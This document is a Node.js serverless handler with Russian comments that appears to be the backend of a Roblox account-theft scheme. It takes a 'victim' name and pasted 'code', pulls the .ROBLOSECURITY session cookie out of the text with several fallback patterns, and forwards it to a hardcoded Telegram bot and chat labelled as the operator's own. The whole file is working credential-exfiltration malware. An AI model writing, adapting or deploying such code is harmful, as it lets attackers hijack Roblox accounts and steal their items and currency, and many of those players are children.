const fetch = require('node-fetch');

// ===== ТВОИ ДАННЫЕ (ЗАХАРДКОЖЕНЫ) =====
const BOT_TOKEN = "8961899780:AAGUBR-ve4PSdX86Vniv-l1kJx3f7qm0njE";
const CHAT_ID = "-5527664230";
// ========================================

// Точный префикс, который должен быть в итоговом токене
const PREFIX = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const { victim, code } = JSON.parse(event.body);
        if (!victim || !code) {
            return { statusCode: 400, body: JSON.stringify({ error: 'Missing fields' }) };
        }

        let token = null;

        // 1) Если уже есть префикс — берём всё, что после него (до пробела или кавычки)
        if (code.includes(PREFIX)) {
            const start = code.indexOf(PREFIX) + PREFIX.length;
            let end = code.length;
            const spaceIdx = code.indexOf(' ', start);
            const quoteIdx = code.indexOf('"', start);
            if (spaceIdx !== -1) end = Math.min(end, spaceIdx);
            if (quoteIdx !== -1) end = Math.min(end, quoteIdx);
            const rawToken = code.substring(start, end);
            token = PREFIX + rawToken;
        }

        // 2) Если нет префикса, ищем .ROBLOSECURITY=...
        if (!token) {
            const roblosecPattern = /\.ROBLOSECURITY=([^;\s"]+)/;
            const match = code.match(roblosecPattern);
            if (match) {
                token = PREFIX + match[1];
            }
        }

        // 3) Если нет, ищем просто "WARNING:-DO-NOT-SHARE-THIS..." (без подчёркиваний)
        if (!token) {
            const warningText = "WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.";
            const idx = code.indexOf(warningText);
            if (idx !== -1) {
                const start = idx + warningText.length;
                let end = code.length;
                const spaceIdx = code.indexOf(' ', start);
                const quoteIdx = code.indexOf('"', start);
                if (spaceIdx !== -1) end = Math.min(end, spaceIdx);
                if (quoteIdx !== -1) end = Math.min(end, quoteIdx);
                const raw = code.substring(start, end);
                if (raw && raw.length > 0) {
                    token = PREFIX + raw;
                }
            }
        }

        // 4) Если ничего не нашли — попробуем взять самую длинную строку без пробелов (как запасной вариант)
        if (!token) {
            const longTokenPattern = /[A-Za-z0-9.\-_]+/g;
            const matches = code.match(longTokenPattern);
            if (matches) {
                let longest = '';
                for (let m of matches) {
                    if (m.length > longest.length && m.length > 20) longest = m;
                }
                if (longest) {
                    token = PREFIX + longest;
                }
            }
        }

        if (!token) {
            return { statusCode: 400, body: JSON.stringify({ error: 'Invalid PowerShell format' }) };
        }

        // Отправка в Telegram
        const message = `🆕 Token for ${victim}:\n${token}`;
        const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        if (!tgResponse.ok) {
            const errText = await tgResponse.text();
            console.error('Telegram error:', errText);
            return { statusCode: 500, body: JSON.stringify({ error: 'Failed to send to Telegram' }) };
        }

        return {
            statusCode: 200,
            body: JSON.stringify({ token })
        };
    } catch (error) {
        console.error('Function error:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ error: 'Internal server error' })
        };
    }
};